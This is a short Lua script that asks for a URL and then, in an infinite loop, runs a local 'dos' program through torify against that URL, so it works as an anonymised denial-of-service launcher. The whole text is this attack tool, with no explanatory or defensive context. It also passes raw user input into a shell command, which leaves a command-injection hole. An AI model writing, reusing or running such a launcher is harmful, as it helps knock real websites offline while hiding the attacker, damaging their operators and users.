io.write("enter url: ")
local url = io.read("*l")
while true
do
os.execute("torify ./dos " .. url .. " 1000")
end